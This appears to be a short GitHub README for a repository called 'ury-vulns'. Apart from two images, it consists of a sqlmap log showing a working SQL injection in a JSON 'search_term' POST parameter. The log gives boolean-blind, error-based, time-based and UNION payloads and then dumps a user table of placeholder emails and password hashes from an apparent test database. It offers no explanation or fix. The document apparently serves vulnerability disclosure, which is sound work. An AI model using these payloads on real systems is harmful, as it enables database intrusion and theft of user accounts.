# ury-vulns



<img width="462" height="239" alt="image" src="https://github.com/user-attachments/assets/08de380c-a7d8-4c3b-a5ae-a8af71d7a7d9" />


<img width="885" height="259" alt="image" src="https://github.com/user-attachments/assets/99a255e5-aa00-4280-a402-cf11b0026c38" />
```bash
[22:06:20] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: {"search_term":"-5917' OR 3019=3019#","status":"Draft","start":0}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: {"search_term":"' AND (SELECT 4950 FROM(SELECT COUNT(*),CONCAT(0x71767a6a71,(SELECT (ELT(4950=4950,1))),0x716b767a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- iJmX","status":"Draft","start":0}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"search_term":"' AND (SELECT 4647 FROM (SELECT(SLEEP(5)))FtuM)-- hRyJ","status":"Draft","start":0}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 9 columns
    Payload: {"search_term":"' UNION ALL SELECT NULL,NULL,CONCAT(0x71767a6a71,0x4454546e666a664c7372474d497662697251577a764d74564f63476251724352786a69546b787a78,0x716b767a71),NULL,NULL,NULL,NULL#","status":"Draft","start":0}
---
[22:06:20] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:06:20] [INFO] fetching columns for table 'tabUser' in database 'test_ury'
[22:06:20] [WARNING] reflective value(s) found and filtering out
[22:06:20] [INFO] fetching entries for table 'tabUser' in database 'test_ury'
Database: test_ury
Table: tabUser
[3 entries]
+-----------------------+-----------------------+---------+---------------------+-------------------------+---------------+
| email                 | name                  | enabled | creation            | password                | full_name     |
+-----------------------+-----------------------+---------+---------------------+-------------------------+---------------+
| admin@example.com     | Administrator         | 1       | 2025-10-28 11:48:01 | pbkdf2:sha256:test_hash | Administrator |
| cashier@example.com   | cashier@example.com   | 1       | 2025-10-28 11:48:01 | pbkdf2:sha256:test_hash | Cashier User  |
| test_user@example.com | test_user@example.com | 1       | 2025-10-28 11:48:01 | pbkdf2:sha256:test_hash | Test User     |
+-----------------------+-----------------------+---------+---------------------+-------------------------+---------------+
```
